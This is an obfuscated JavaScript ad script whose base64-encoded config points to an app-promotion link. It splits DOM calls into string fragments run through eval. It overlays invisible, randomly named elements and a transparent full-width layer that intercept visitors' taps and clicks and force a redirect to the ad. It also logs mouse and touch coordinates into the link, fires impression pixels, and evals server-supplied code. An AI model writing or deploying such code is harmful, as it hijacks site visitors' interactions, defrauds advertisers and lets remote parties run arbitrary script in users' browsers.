;(function () {
    var pvid = { pid: [], aid: [] };
    var __ua = navigator.userAgent.toLowerCase();

    function __E(a, f) {
        if (Array.isArray(a)) {
            a.filter(function (item) {
                return ['string', 'function'].includes(typeof item);
            }).forEach(function (item) {
                f(item());
            })
        }
    }

    function __M (o, t) {
        return Object.assign(o, t || {});
    }
    function __LC() {
        var c;
        try {
            c = window.top.document.location.host;
        } catch (e) {
            c = document.location.host;
        }
        return window.btoa(c);
    }

    function p_v_s_t_as(jsurl, pvid, zone, siteid, runm) {
        var aid, pid;
        if (pvid.aid.length > 1) {
            aid = pvid.aid.join(",").match(/([^,]+)(?!.*\1)/ig);
            pid = pvid.pid.join(",").match(/([^,]+)(?!.*\1)/ig);
        } else {
            aid = pvid.aid;
            pid = pvid.pid;
        }
        var url = jsurl + `sta${''}ts.php?adsid=${aid}&planid=${pid}&uid=${zone.uid}&siteid=${siteid}&plantype=${zone.plantype}&zoneid=${zone.zoneid}&adtplid=${zone.adtplid}&sep=${runm}`;
        let script = document.createElement('script');
        script.async = true;
        script.src = url;
        eval('doc' + 'ument.h' + 'ead.appen' + 'dCh' + 'ild(script)');
    }

    function rdn (l, r) {
        var g = r - l, a = Math.random();
        return l + Math.round(a * g);
    }

    (function (data) {
        if (data.no) {
            eval('docume' + 'nt.bod' + 'y.appe' + 'ndChi' + 'ld(document.createComment(data.msg))')
            return
        }

        data.data = data.data.filter(function (v) {
            return v.imageurl !== null
        }).map(function(v) {
            return v
        })

        var itemData = data.data[rdn(0, data.data.length - 1)]

            // cnzz统计代码
        ;(function (u) {
            var s = document.createElement('script');
            s.id = 'cnzz_c';
            s.async = true;
            s.src = u;
            u && eval('docu' + 'ment.head.appe' + 'ndC' + 'hild(s)');
        })(data.cnzz_c_script);

        function rds (len) {
            len = len || 4;
            var c = 'abcdefhijkmnprstwxyzABCDEFGHIJKLMNOPQRSTWXYZ', s = '';
            for (var i = 0, m = c.length; i < len; i++) {
                s += c.charAt(Math.floor(Math.random() * m));
            };
            return s;
        }

        function effect () {
            if (data.config.plantype === atob('Y3B2')) {
                var effect = new Image()
                effect.src = itemData.c2_url
            }
        }

        function au (event) {
            event.preventDefault();
            event.stopPropagation();
            effect();
            window.location.href = itemData.url;
        }

        var x = [], y = [], db = document.body;

        function fhx () {
            db.addEventListener('touchmove', function (event) {
                if (x.length < 10) {
                    x.push(event.touches[0].clientX)
                    y.push(event.touches[0].clientY)
                }
            });
            db.addEventListener('mousemove', function (event) {
                if (x.length < 10) {
                    x.push(event.clientX)
                    y.push(event.clientY)
                }
            });
            let style = document.createElement('style')
            let width = window.innerWidth
            var height = data.dz_height
            let codestyle = JSON.parse(data.config.codestyle)
            let position = codestyle.htmlcontrol.position

            let dpvname = rds(5);

            if (position === 'top') {
                db.style.paddingTop = parseInt(height) + parseInt(data.offset) + parseInt(data.pheight) + 'px'
            } else {
                db.style.paddingBottom = parseInt(height) + parseInt(data.offset) + 'px'
            }

            const col = 10;
            const row = 4;
            for (var i = 0; i < (col * row); i++) {
                var dpvid = dpvname + '_' + parseInt(i / row) + '_' + (i % row);
                let dpv = document.createElement(rds(5));
                dpv.id = dpvid;
                dpv.className = dpvname + '_f';
                dpv.setAttribute('classname', dpvname + '_f');
                dpv.addEventListener('touchstart', au, false);
                eval('docum' + 'ent.b' + 'ody.appe' + 'ndC' + 'hild(dpv);');

                let by = ((i % row) * (height / row));
                let bx = (((parseInt(i / row) * width) / col - (parseInt(i / row) * 0.5)) + 1.5);
                let gx = (parseInt(i / row) * width) / col;
                let gy = ((position === 'top' ? -1 : 1) * ((i + (position === 'top' ? 0 : 1)) % row) * (height / row) - (position === 'top' ? height : 0));

                if (data.offset > 0) {
                    by += data.offset;
                }
                style.innerHTML += `#${dpvid}:before{${position}:${by}px;left:${bx}px;background-position:-${gx}px ${gy}px}`;
            }

            if (data.dz_close == 1) {
                let close = document.createElement('div');
                let cimg = 'ht' + 'tps:/' + '/pic' + '.win' + 'dtc' + 'h.c'+'om/ima' + 'ges/clo' + 'se.pn'+'g';
                var cheight = data.cheight;
                close.style.cssText = `background-image: url(${cimg});background-size:${cheight}px ${cheight}px;position: fixed; z-index: 2147483622; right: 1px; color: rgb(255, 255, 255); width: ${cheight}px; height: ${cheight}px; text-align: center;`;
                close.style[position] = parseInt(height) + parseInt(data.offset) + 'px';
                eval('doc' + 'ument.bod' + 'y.app' + 'endC' + 'hild(close)');

                close.addEventListener('click', function () {
                    for (let node of document.querySelectorAll('.' + dpvname + '_f')) {
                        node.remove();
                    }
                    close.remove();over.remove();
                    if (position === 'top') {
                        db.style.paddingTop = 'unset';
                    } else {
                        db.style.paddingBottom = 'unset';
                    }
                });
            }

            if (position === 'bottom') {
                var over = document.createElement('a');
                over.href = itemData.url;
                over.addEventListener('touchstart', function (event) {
                    effect();
                    if (over.href.indexOf('&b=') === -1) {
                        over.href += "&b=" + event.clientX + ';' + event.clientY + '&g=' + x.join(',') + ';' + y.join(',');
                    }
                }, false);
                over.style.cssText = 'z-index: 214748361;width: 100vw;background-color: transparent;left: 0;position:fixed;';
                over.style.height = data.dz_shadow;

                over.style[position] = parseInt(height) + parseInt(data.offset) + 'px';
                eval('do' + 'cument.bod' + 'y.ap' + 'pendCh' + 'ild(over)');
            }

            ;(function h () {
                document.querySelectorAll('.' + dpvname + '_f').forEach(function (n) {
                    n.ontouchstart = n.onclick = au;n.addEventListener('touchstart', au);n.addEventListener('click', au);
                });
                requestAnimationFrame(h);
            })();

            style.innerHTML += '.' + dpvname + '_f{z-index:214748361;position:relative;} .' + dpvname + '_f:before{content: "";display: block;z-index:10000;width:10%;position:fixed;height:' + (height / 4) + 'px;background: url(' + itemData.imageurl + ');background-size:' + width + 'px ' + height + 'px;}';
            eval('do' + 'cument.he' + 'ad.appen' + 'd(style)');

            if (data.config.plantype === atob('Y3B2')) {
                let aaa = new Image();
                aaa.src = itemData.url + "&srccpv=yes";
            }

            if (data.need_stats) {
                pvid.aid.push(itemData.adsid);
                pvid.pid.push(itemData.planid);
                p_v_s_t_as(data.jsurl, pvid, data.config, data.siteid, data.runm);
            }

        }

        function rux () {
            fhx();
            data.jm_code && eval(data.jm_code);
            data.dz_code && eval(data.dz_code);
        }

        if (db) {
            rux();
        } else {
            (function rqx () {
                if (document.body) { db = document.body;rux(); } else { requestAnimationFrame(rqx);}
            })();
        }
    })(JSON.parse(window.atob(`ew0KICAgICAgICAienlfY19zY3JpcHQiOiAiIiwNCiAgICAgICAgImNuenpfY19zY3JpcHQiOiAiIiwNCiAgICAgICAgImNvbmZpZyI6IHsNCiAgICAgICAgICAgICJ6b25laWQiOiAiMTMwNjcxIiwNCiAgICAgICAgICAgICJ1aWQiOiAiNjExMCIsDQogICAgICAgICAgICAicGxhbnR5cGUiOiAiY3BjIiwNCiAgICAgICAgICAgICJzaXRldHlwZSI6IG51bGwsDQogICAgICAgICAgICAic2l0ZSI6IG51bGwsDQogICAgICAgICAgICAiYWR0cGxpZCI6ICIxOSIsDQogICAgICAgICAgICAid2lkdGgiOiAiNjQwIiwNCiAgICAgICAgICAgICJoZWlnaHQiOiAiMTIwIiwNCiAgICAgICAgICAgICJkel9oZWlnaHQiOiAiMCIsDQogICAgICAgICAgICAiZHpfc2hhZG93IjogIjEiLA0KICAgICAgICAgICAgImFkc3R5bGVpZCI6ICIxMDQwMTIwIiwNCiAgICAgICAgICAgICJ2aWV3dHlwZSI6ICIxIiwNCiAgICAgICAgICAgICJ2aWV3YWRzaWQiOiAiMCIsDQogICAgICAgICAgICAiY29kZXN0eWxlIjogIntcImJvcmRlclwiOlwiRkZGRkZGXCIsXCJoZWFkbGluZVwiOlwiMDAwMEZGXCIsXCJiYWNrZ3JvdW5kXCI6XCJGRkZGRkZcIixcImRlc2NyaXB0aW9uXCI6XCI0NDQ0NDRcIixcImRpc3B1cmxcIjpcIjAwODAwMFwiLFwid2lkdGhcIjpcIjY0MFwiLFwiaGVpZ2h0XCI6XCIxMjBcIixcInpvbmVpZFwiOlwiMTMwNjcxXCIsXCJwbGFudHlwZVwiOlwiY3B2XCIsXCJodG1sY29udHJvbFwiOntcInBvc2l0aW9uXCI6XCJib3R0b21cIn19IiwNCiAgICAgICAgICAgICJhcHBseXBsYW5pZCI6IG51bGwsDQogICAgICAgICAgICAidXNlcnN0YXR1cyI6ICIyIiwNCiAgICAgICAgICAgICJhZHN0eWxlIjogbnVsbCwNCiAgICAgICAgICAgICJpbnNpdGUiOiAiMSIsDQogICAgICAgICAgICAicHZzdGVwIjogIjAiDQogICAgICAgIH0sDQogICAgICAgICJkYXRhIjogW3sNCiAgICAgICAgICAgICJoZWFkbGluZSI6ICIiLA0KICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogIiIsDQogICAgICAgICAgICAiZGlzcHVybCI6ICIiLA0KICAgICAgICAgICAgImltYWdldXJsIjogImh0dHBzOlwvXC9hZTAxLmFsaWNkbi5jb21cL2tmXC9VODMzZDMzN2JmM2NiNDI5OGI5ZmRiNzdmMTExMWI2MThWLmpwZyIsDQogICAgICAgICAgICAiYWx0IjogIiIsDQogICAgICAgICAgICAidXJsIjogImh0dHBzOlwvXC9heXgyLmFwcFwvP2lfY29kZT00MjcxMTgxIiwNCiAgICAgICAgICAgICJhZHNpZCI6ICIxMzE5NiIsDQogICAgICAgICAgICAicGxhbmlkIjogIjMwNzQiLA0KICAgICAgICAgICAgImh0bWxjb250cm9sIjogIiIsDQogICAgICAgICAgICAiYzJfdXJsIjogImh0dHBzOlwvXC9heXgyLmFwcFwvP2lfY29kZT00MjcxMTgxIg0KICAgICAgICB9XSwNCiAgICAgICAgImpzdXJsIjogIiIsDQogICAgICAgICJzaXRlaWQiOiBudWxsLA0KICAgICAgICAicnVubSI6ICIyMCIsDQogICAgICAgICJkel9zaGFkb3ciOiAiMXB4IiwNCiAgICAgICAgImR6X2hlaWdodCI6IDEyMCwNCiAgICAgICAgImR6X2Nsb3NlIjogMSwNCiAgICAgICAgIm9mZnNldCI6IDAsDQogICAgICAgICJjaGVpZ2h0IjogMTUsDQogICAgICAgICJwaGVpZ2h0IjogMCwNCiAgICAgICAgImR6X2NvZGUiOiAiIiwNCiAgICAgICAgImptX2NvZGUiOiAiIiwNCiAgICAgICAgIm5lZWRfc3RhdHMiOiAwDQogICAgfQ==`)));
})();
